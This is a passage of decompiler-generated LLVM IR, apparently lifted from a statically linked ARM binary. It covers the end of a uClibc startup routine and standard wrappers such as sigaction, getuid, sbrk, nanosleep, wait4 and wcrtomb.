  br i1 %v3_16c28, label %bb44, label %dec_label_pc_16c38

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_16c38

dec_label_pc_16c38:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_16c28, i32 ptrtoint ([3 x i8]* @global_var_14940.1068 to i32))
  %v0_16c34 = load i32, i32* @r4, align 4
  %v1_16c34 = add i32 %v0_16c34, 8
  store i32 %v1_16c34, i32* @r4, align 4
  %v1_16c38 = inttoptr i32 %v1_16c34 to i32*
  %v2_16c38 = load i32, i32* %v1_16c38, align 4
  %v2_16c3c = icmp eq i32 %v2_16c38, 0
  br i1 %v2_16c3c, label %dec_label_pc_16c44, label %dec_label_pc_16c20

dec_label_pc_16c44:                               ; preds = %dec_label_pc_16c38, %dec_label_pc_16c18
  %v1_16c48 = call i32 @_dl_aux_init(i32 %v2_16bb0)
  store i32 %v1_16c48, i32* @r0, align 4
  %v1_16c4c = call i32 @__GI___uClibc_init(i32 %v1_16c48)
  store i32 %v1_16c4c, i32* @r0, align 4
  %v2_16c58 = icmp eq i32 %tmp37, 0
  br i1 %v2_16c58, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_16c44
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_16c44, %bb45
  %v0_16c68 = phi i32 [ %tmp37, %dec_label_pc_16c44 ], [ 4096, %bb45 ]
  %v3_16c60 = icmp eq i32 %tmp36, -1
  %v8_16c60 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_2c810.813 to i32), i32* @r2, align 4
  store i32 %v0_16c68, i32* @global_var_2c810.813, align 4
  br i1 %v3_16c60, label %dec_label_pc_16c70, label %dec_label_pc_16c98

dec_label_pc_16c70:                               ; preds = %bb46
  %v0_16c70 = call i32 @getuid()
  store i32 %v0_16c70, i32* @r0, align 4
  store i32 %v0_16c70, i32* @r4, align 4
  %v0_16c78 = call i32 @geteuid()
  %v0_16c7c = load i32, i32* @r4, align 4
  %v9_16c7c = icmp eq i32 %v0_16c7c, %v0_16c78
  br i1 %v9_16c7c, label %dec_label_pc_16c84, label %dec_label_pc_16cc0

dec_label_pc_16c84:                               ; preds = %dec_label_pc_16c70
  %v1_16c84 = call i32 @getgid(i32 %v0_16c78)
  store i32 %v1_16c84, i32* @r0, align 4
  store i32 %v1_16c84, i32* @r4, align 4
  %v0_16c8c = call i32 @getegid()
  %v0_16c90 = load i32, i32* @r4, align 4
  %v9_16c90 = icmp eq i32 %v0_16c90, %v0_16c8c
  br i1 %v9_16c90, label %dec_label_pc_16c98, label %dec_label_pc_16cc0

dec_label_pc_16c98:                               ; preds = %dec_label_pc_16c84, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_16c60, label %dec_label_pc_16d2c, label %dec_label_pc_16ca4

dec_label_pc_16ca4:                               ; preds = %dec_label_pc_16c98
  %v9_16ca8 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_16ca8, label %dec_label_pc_16cb0, label %dec_label_pc_16cc0

dec_label_pc_16cb0:                               ; preds = %dec_label_pc_16ca4
  br label %dec_label_pc_16cc0

dec_label_pc_16cc0:                               ; preds = %dec_label_pc_16cb0, %dec_label_pc_16ca4, %dec_label_pc_16c84, %dec_label_pc_16c70
  %v2_16cc8 = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_16cd4 = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_16ce0 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_16d2c

dec_label_pc_16d2c:                               ; preds = %dec_label_pc_16cc0, %dec_label_pc_16c98
  %v0_16cf0 = load i32, i32* @r6, align 4
  %v1_16cf0 = inttoptr i32 %v0_16cf0 to i32*
  %v2_16cf0 = load i32, i32* %v1_16cf0, align 4
  store i32 %v2_16cf0, i32* @global_var_26584, align 4
  store i32 %arg5, i32* @global_var_2c814.1052, align 4
  %v2_16d2c = icmp eq i32 %arg4, 0
  br i1 %v2_16d2c, label %dec_label_pc_16d68, label %bb47

bb47:                                             ; preds = %dec_label_pc_16d2c
  br label %dec_label_pc_16d68

dec_label_pc_16d68:                               ; preds = %dec_label_pc_16d2c, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_16d78 = call i32 @__errno_location()
  %v2_16d80 = inttoptr i32 %v1_16d78 to i32*
  store i32 0, i32* %v2_16d80, align 4
  %v1_16d94 = call i32 @__GI___h_errno_location()
  %v2_16d9c = inttoptr i32 %v1_16d94 to i32*
  store i32 0, i32* %v2_16d9c, align 4
  %v0_16dac = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_16db8 = call i32 @__GI_exit(i32 %v0_16dac)
  ret i32 %v1_16db8

; uselistorder directives
  uselistorder i32 %v2_16c38, { 1, 0 }
  uselistorder i32 %v1_16c34, { 1, 0 }
  uselistorder i1 %v2_16c20, { 1, 0 }
  uselistorder i32 %v4_16c08, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32* @global_var_2c810.813, { 1, 5, 0, 2, 3, 4 }
  uselistorder i32 4096, { 2, 3, 15, 6, 16, 4, 1, 12, 5, 7, 8, 13, 14, 9, 17, 10, 18, 0, 11 }
  uselistorder i32 14, { 2, 0, 1 }
  uselistorder i32 13, { 1, 3, 0, 2 }
  uselistorder i32 120, { 2, 0, 1 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16d68, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_16c38, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_16c20, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_16df0 = load i32, i32* @r4, align 4
  %v6_16df0 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_16df4 = icmp eq i32* %arg2, null
  %v2_16df8 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_16df4, label %dec_label_pc_16e64, label %dec_label_pc_16e08

dec_label_pc_16e08:                               ; preds = %entry
  %v2_16e0c = load i32, i32* %arg2, align 4
  %v4_16e0c = add i32 %tmp, 4
  store i32 %v4_16e0c, i32* @r1, align 4
  %v2_16e10 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_16e10, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_16e0c, i32* %stack_var_-156, align 4
  %v0_16e1c = call i32 @memcpy()
  store i32 %v0_16e1c, i32* %r0.global-to-local, align 4
  %v0_16e20 = load i32, i32* @r4, align 4
  %v1_16e20 = add i32 %v0_16e20, 132
  %v2_16e20 = inttoptr i32 %v1_16e20 to i32*
  %v3_16e20 = load i32, i32* %v2_16e20, align 4
  %v1_16e24 = and i32 %v3_16e20, 67108864
  %v2_16e24 = icmp eq i32 %v1_16e24, 0
  br i1 %v2_16e24, label %dec_label_pc_16e38, label %bb

bb:                                               ; preds = %dec_label_pc_16e08
  br label %dec_label_pc_16e54

dec_label_pc_16e38:                               ; preds = %dec_label_pc_16e08
  %v1_16e40 = and i32 %v3_16e20, 4
  %v2_16e40 = icmp eq i32 %v1_16e40, 0
  br i1 %v2_16e40, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_16e38
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_16e38, %bb20
  br label %dec_label_pc_16e54

dec_label_pc_16e54:                               ; preds = %bb, %bb21
  %v2_16e54 = icmp eq i32 %v0_16e20, 0
  %v3_16e58 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_16e58 = select i1 %v2_16e54, i32 0, i32 %v3_16e58
  %v0_16e64.pre = load i32, i32* @r5, align 4
  %v0_16e74.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16e64

dec_label_pc_16e64:                               ; preds = %dec_label_pc_16e54, %entry
  %v0_16e74 = phi i32 [ %arg1, %entry ], [ %v0_16e74.pre, %dec_label_pc_16e54 ]
  %v0_16e64 = phi i32 [ %arg3, %entry ], [ %v0_16e64.pre, %dec_label_pc_16e54 ]
  %storemerge = phi i32 [ 0, %entry ], [ %.v3_16e58, %dec_label_pc_16e54 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_16e64 = icmp eq i32 %v0_16e64, 0
  %.v2_16df8 = select i1 %v2_16e64, i32 0, i32 %v2_16df8
  store i32 %.v2_16df8, i32* @r2, align 4
  store i32 %v0_16e74, i32* %r0.global-to-local, align 4
  %v1_16e78 = call i32 @__syscall_rt_sigaction(i32 %v0_16e74)
  store i32 %v1_16e78, i32* %r0.global-to-local, align 4
  %v0_16e7c = load i32, i32* @r5, align 4
  %v2_16e7c = icmp eq i32 %v0_16e7c, 0
  br i1 %v2_16e7c, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_16e64
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_16e64, %bb25
  %v0_16e8c.pr = phi i32 [ 0, %dec_label_pc_16e64 ], [ 1, %bb25 ]
  %v1_16e84 = icmp slt i32 %v1_16e78, 0
  br i1 %v1_16e84, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_16ec0

thread-pre-split:                                 ; preds = %bb26
  %v2_16e8c = icmp eq i32 %v0_16e8c.pr, 0
  store i32 %v1_16e78, i32* @r4, align 4
  br i1 %v2_16e8c, label %dec_label_pc_16ec0, label %dec_label_pc_16e98

dec_label_pc_16e98:                               ; preds = %thread-pre-split
  %v2_16e98 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_16e7c, i32* %r0.global-to-local, align 4
  %v2_16ea0 = inttoptr i32 %v0_16e7c to i32*
  store i32 %v2_16e98, i32* %v2_16ea0, align 4
  %v3_16ea0 = load i32, i32* %r0.global-to-local, align 4
  %v4_16ea0 = add i32 %v3_16ea0, 4
  store i32 %v4_16ea0, i32* @r0, align 4
  %v2_16ea4 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_16ea4, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_16eac = call i32 @memcpy()
  store i32 %v0_16eac, i32* %r0.global-to-local, align 4
  %v1_16eb4 = load i32, i32* @r5, align 4
  %v2_16eb4 = add i32 %v1_16eb4, 136
  %v3_16eb4 = inttoptr i32 %v2_16eb4 to i32*
  %v1_16ebc = load i32, i32* @r5, align 4
  %v2_16ebc = add i32 %v1_16ebc, 132
  %v3_16ebc = inttoptr i32 %v2_16ebc to i32*
  %v0_16ec0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16ec0

dec_label_pc_16ec0:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_16e98
  %v0_16ec0 = phi i32 [ %v1_16e78, %thread-pre-split ], [ %v0_16ec0.pre, %dec_label_pc_16e98 ], [ %v1_16e78, %thread-pre-split.thread ]
  store i32 %v0_16ec0, i32* %r0.global-to-local, align 4
  store i32 %v3_16df0, i32* @r4, align 4
  store i32 %v6_16df0, i32* @r5, align 4
  ret i32 %v0_16ec0

; uselistorder directives
  uselistorder i32 %v0_16ec0, { 1, 0 }
  uselistorder i32 %v0_16e7c, { 1, 0, 2 }
  uselistorder i32 %v0_16e74, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 6, 5, 7, 0 }
  uselistorder i32 136, { 1, 0 }
  uselistorder i32 132, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16ec0, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_16e54, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_16ed4 = load i32, i32* @r4, align 4
  store i32 %v3_16ed4, i32* %stack_var_-8, align 4
  %v0_16ed8 = load i32, i32* @r0, align 4
  %v0_16edc = call i32 @__errno_location()
  %v1_16ee0 = sub i32 0, %v0_16ed8
  %v2_16ee4 = inttoptr i32 %v0_16edc to i32*
  store i32 %v1_16ee0, i32* %v2_16ee4, align 4
  %v2_16eec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16eec, i32* @r4, align 4
  ret i32 -1
}

define i32 @__default_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_16ef0 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_16ef0
}

define i32 @__default_rt_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_16ef4 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_16ef4
}

define i32 @__syscall_rt_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16ef8 = load i32, i32* @r4, align 4
  store i32 %v3_16ef8, i32* %stack_var_-8, align 4
  %v1_16efc = load i32, i32* @r1, align 4
  %v2_16efc = inttoptr i32 %v1_16efc to %sigaction*
  %v3_16efc = load i32, i32* @r2, align 4
  %v4_16efc = inttoptr i32 %v3_16efc to %sigaction*
  %v5_16efc = call i32 @sigaction(i32 %arg1, %sigaction* %v2_16efc, %sigaction* %v4_16efc)
  store i32 %v5_16efc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_16efc, -4095
  br i1 %tmp, label %dec_label_pc_16f1c, label %dec_label_pc_16f0c

dec_label_pc_16f0c:                               ; preds = %entry
  %v0_16f0c = call i32 @__errno_location()
  %v0_16f10 = load i32, i32* %r4.global-to-local, align 4
  %v1_16f10 = sub i32 0, %v0_16f10
  %v2_16f14 = inttoptr i32 %v0_16f0c to i32*
  store i32 %v1_16f10, i32* %v2_16f14, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16f1c

dec_label_pc_16f1c:                               ; preds = %entry, %dec_label_pc_16f0c
  %v0_16f1c = phi i32 [ %v5_16efc, %entry ], [ -1, %dec_label_pc_16f0c ]
  %v2_16f20 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16f20, i32* %r4.global-to-local, align 4
  ret i32 %v0_16f1c

; uselistorder directives
  uselistorder i32 %v5_16efc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16f1c, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16f24 = load i32, i32* @r4, align 4
  store i32 %v3_16f24, i32* %stack_var_-8, align 4
  %v0_16f28 = load i32, i32* @r0, align 4
  %v1_16f28 = inttoptr i32 %v0_16f28 to i8*
  %v2_16f28 = load i32, i32* @r1, align 4
  %v3_16f28 = inttoptr i32 %v2_16f28 to i8*
  %v4_16f28 = insertvalue [1 x i8*] undef, i8* %v3_16f28, 0
  %v5_16f28 = load i32, i32* @r2, align 4
  %v6_16f28 = inttoptr i32 %v5_16f28 to i8*
  %v7_16f28 = insertvalue [1 x i8*] undef, i8* %v6_16f28, 0
  %v8_16f28 = call i32 @execve(i8* %v1_16f28, [1 x i8*] %v4_16f28, [1 x i8*] %v7_16f28)
  store i32 %v8_16f28, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_16f28, -4095
  br i1 %tmp, label %dec_label_pc_16f48, label %dec_label_pc_16f38

dec_label_pc_16f38:                               ; preds = %entry
  %v0_16f38 = call i32 @__errno_location()
  %v0_16f3c = load i32, i32* %r4.global-to-local, align 4
  %v1_16f3c = sub i32 0, %v0_16f3c
  %v2_16f40 = inttoptr i32 %v0_16f38 to i32*
  store i32 %v1_16f3c, i32* %v2_16f40, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16f48

dec_label_pc_16f48:                               ; preds = %entry, %dec_label_pc_16f38
  %v0_16f48 = phi i32 [ %v8_16f28, %entry ], [ -1, %dec_label_pc_16f38 ]
  %v2_16f4c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16f4c, i32* @r4, align 4
  ret i32 %v0_16f48

; uselistorder directives
  uselistorder i32 %v8_16f28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16f48, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16f50 = load i32, i32* @r4, align 4
  store i32 %v3_16f50, i32* %stack_var_-8, align 4
  %v0_16f58 = load i32, i32* @r0, align 4
  store i32 %v0_16f58, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16f58, -4095
  br i1 %tmp, label %dec_label_pc_16f74, label %dec_label_pc_16f64

dec_label_pc_16f64:                               ; preds = %entry
  %v0_16f64 = call i32 @__errno_location()
  %v0_16f68 = load i32, i32* %r4.global-to-local, align 4
  %v1_16f68 = sub i32 0, %v0_16f68
  %v2_16f6c = inttoptr i32 %v0_16f64 to i32*
  store i32 %v1_16f68, i32* %v2_16f6c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_16f78.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16f74

dec_label_pc_16f74:                               ; preds = %entry, %dec_label_pc_16f64
  %v2_16f78 = phi i32 [ %v3_16f50, %entry ], [ %v2_16f78.pre, %dec_label_pc_16f64 ]
  %v0_16f74 = phi i32 [ %v0_16f58, %entry ], [ -1, %dec_label_pc_16f64 ]
  store i32 %v2_16f78, i32* @r4, align 4
  ret i32 %v0_16f74

; uselistorder directives
  uselistorder i32 %v0_16f58, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16f74, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16f7c = load i32, i32* @r4, align 4
  store i32 %v3_16f7c, i32* %stack_var_-8, align 4
  %v0_16f84 = load i32, i32* @r0, align 4
  store i32 %v0_16f84, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16f84, -4095
  br i1 %tmp, label %dec_label_pc_16fa0, label %dec_label_pc_16f90

dec_label_pc_16f90:                               ; preds = %entry
  %v0_16f90 = call i32 @__errno_location()
  %v0_16f94 = load i32, i32* %r4.global-to-local, align 4
  %v1_16f94 = sub i32 0, %v0_16f94
  %v2_16f98 = inttoptr i32 %v0_16f90 to i32*
  store i32 %v1_16f94, i32* %v2_16f98, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_16fa4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16fa0

dec_label_pc_16fa0:                               ; preds = %entry, %dec_label_pc_16f90
  %v2_16fa4 = phi i32 [ %v3_16f7c, %entry ], [ %v2_16fa4.pre, %dec_label_pc_16f90 ]
  %v0_16fa0 = phi i32 [ %v0_16f84, %entry ], [ -1, %dec_label_pc_16f90 ]
  store i32 %v2_16fa4, i32* @r4, align 4
  ret i32 %v0_16fa0

; uselistorder directives
  uselistorder i32 %v0_16f84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16fa0, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16fa8 = load i32, i32* @r4, align 4
  store i32 %v3_16fa8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16fcc, label %dec_label_pc_16fbc

dec_label_pc_16fbc:                               ; preds = %entry
  %v0_16fbc = call i32 @__errno_location()
  %v0_16fc0 = load i32, i32* %r4.global-to-local, align 4
  %v1_16fc0 = sub i32 0, %v0_16fc0
  %v2_16fc4 = inttoptr i32 %v0_16fbc to i32*
  store i32 %v1_16fc0, i32* %v2_16fc4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_16fd0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16fcc

dec_label_pc_16fcc:                               ; preds = %entry, %dec_label_pc_16fbc
  %v2_16fd0 = phi i32 [ %v3_16fa8, %entry ], [ %v2_16fd0.pre, %dec_label_pc_16fbc ]
  %v0_16fcc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_16fbc ]
  store i32 %v2_16fd0, i32* %r4.global-to-local, align 4
  ret i32 %v0_16fcc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16fcc, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16fd4 = load i32, i32* @r4, align 4
  store i32 %v3_16fd4, i32* %stack_var_-8, align 4
  %v0_16fdc = load i32, i32* @r0, align 4
  store i32 %v0_16fdc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16fdc, -4095
  br i1 %tmp, label %dec_label_pc_16ff8, label %dec_label_pc_16fe8

dec_label_pc_16fe8:                               ; preds = %entry
  %v0_16fe8 = call i32 @__errno_location()
  %v0_16fec = load i32, i32* %r4.global-to-local, align 4
  %v1_16fec = sub i32 0, %v0_16fec
  %v2_16ff0 = inttoptr i32 %v0_16fe8 to i32*
  store i32 %v1_16fec, i32* %v2_16ff0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_16ffc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16ff8

dec_label_pc_16ff8:                               ; preds = %entry, %dec_label_pc_16fe8
  %v2_16ffc = phi i32 [ %v3_16fd4, %entry ], [ %v2_16ffc.pre, %dec_label_pc_16fe8 ]
  %v0_16ff8 = phi i32 [ %v0_16fdc, %entry ], [ -1, %dec_label_pc_16fe8 ]
  store i32 %v2_16ffc, i32* %r4.global-to-local, align 4
  ret i32 %v0_16ff8

; uselistorder directives
  uselistorder i32 %v0_16fdc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16ff8, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_17000 = load i32, i32* @r4, align 4
  store i32 %v3_17000, i32* %stack_var_-8, align 4
  %v6_17004 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_17004, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_17004, -4095
  br i1 %tmp6, label %dec_label_pc_17024, label %dec_label_pc_17014

dec_label_pc_17014:                               ; preds = %entry
  %v0_17014 = call i32 @__errno_location()
  %v0_17018 = load i32, i32* %r4.global-to-local, align 4
  %v1_17018 = sub i32 0, %v0_17018
  %v2_1701c = inttoptr i32 %v0_17014 to i32*
  store i32 %v1_17018, i32* %v2_1701c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17024

dec_label_pc_17024:                               ; preds = %entry, %dec_label_pc_17014
  %v0_17024 = phi i32 [ %v6_17004, %entry ], [ -1, %dec_label_pc_17014 ]
  %v2_17028 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17028, i32* %r4.global-to-local, align 4
  ret i32 %v0_17024

; uselistorder directives
  uselistorder i32 %v6_17004, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17024, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1702c = load i32, i32* @r4, align 4
  store i32 %v3_1702c, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_2c844.1086 to i32), i32* %r4.global-to-local, align 4
  %v2_17034 = load i32, i32* @global_var_2c844.1086, align 4
  %v2_17038 = icmp eq i32 %v2_17034, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_17038, label %dec_label_pc_17048, label %dec_label_pc_17054

dec_label_pc_17048:                               ; preds = %entry
  %v2_17048 = call i32 @__GI_brk(i32* null)
  %v1_1704c = icmp slt i32 %v2_17048, 0
  br i1 %v1_1704c, label %dec_label_pc_17074, label %dec_label_pc_17054thread-pre-split

dec_label_pc_17054thread-pre-split:               ; preds = %dec_label_pc_17048
  %v0_17058.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_17054.pre = load i32, i32* @global_var_2c844.1086, align 4
  br label %dec_label_pc_17054

dec_label_pc_17054:                               ; preds = %dec_label_pc_17054thread-pre-split, %entry
  %v2_17054 = phi i32 [ %v2_17054.pre, %dec_label_pc_17054thread-pre-split ], [ %v2_17034, %entry ]
  %v1_17060 = phi i32 [ %v0_17058.pr, %dec_label_pc_17054thread-pre-split ], [ %arg1, %entry ]
  %v2_17058 = icmp eq i32 %v1_17060, 0
  store i32 %v2_17054, i32* %r4.global-to-local, align 4
  br i1 %v2_17058, label %dec_label_pc_17078, label %dec_label_pc_17068

dec_label_pc_17068:                               ; preds = %dec_label_pc_17054
  %v2_17060 = add i32 %v1_17060, %v2_17054
  %v1_17068 = inttoptr i32 %v2_17060 to i32*
  %v2_17068 = call i32 @__GI_brk(i32* %v1_17068)
  %v1_1706c = icmp slt i32 %v2_17068, 0
  br i1 %v1_1706c, label %dec_label_pc_17074, label %dec_label_pc_17068.dec_label_pc_17078_crit_edge

dec_label_pc_17068.dec_label_pc_17078_crit_edge:  ; preds = %dec_label_pc_17068
  %v0_17078.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17078

dec_label_pc_17074:                               ; preds = %dec_label_pc_17068, %dec_label_pc_17048
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17078

dec_label_pc_17078:                               ; preds = %dec_label_pc_17068.dec_label_pc_17078_crit_edge, %dec_label_pc_17054, %dec_label_pc_17074
  %v0_17078 = phi i32 [ %v0_17078.pre, %dec_label_pc_17068.dec_label_pc_17078_crit_edge ], [ %v2_17054, %dec_label_pc_17054 ], [ -1, %dec_label_pc_17074 ]
  %v2_1707c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1707c, i32* @r4, align 4
  ret i32 %v0_17078

; uselistorder directives
  uselistorder i32 %v2_17054, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 22, 23, 20, 21, 19, 18, 17, 24, 25, 26, 2 }
  uselistorder label %dec_label_pc_17078, { 2, 0, 1 }
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17084 = load i32, i32* @r4, align 4
  store i32 %v3_17084, i32* %stack_var_-8, align 4
  %v0_17088 = call i32 @wait4()
  store i32 %v0_17088, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17088, -4095
  br i1 %tmp, label %dec_label_pc_170a8, label %dec_label_pc_17098

dec_label_pc_17098:                               ; preds = %entry
  %v0_17098 = call i32 @__errno_location()
  %v0_1709c = load i32, i32* %r4.global-to-local, align 4
  %v1_1709c = sub i32 0, %v0_1709c
  %v2_170a0 = inttoptr i32 %v0_17098 to i32*
  store i32 %v1_1709c, i32* %v2_170a0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_170a8

dec_label_pc_170a8:                               ; preds = %entry, %dec_label_pc_17098
  %v0_170a8 = phi i32 [ %v0_17088, %entry ], [ -1, %dec_label_pc_17098 ]
  %v2_170ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_170ac, i32* @r4, align 4
  ret i32 %v0_170a8

; uselistorder directives
  uselistorder i32 %v0_17088, { 1, 0, 2 }
  uselistorder i32 ()* @wait4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_170a8, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_2c824.1088 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_170c0 = icmp eq i32 %arg1, 0
  br i1 %v2_170c0, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_170c8 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_170f0 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_170e4 = phi i32 [ %arg1, %.thread ], [ %v3_170c8, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_170dc = ptrtoint i32* %stack_var_-16 to i32
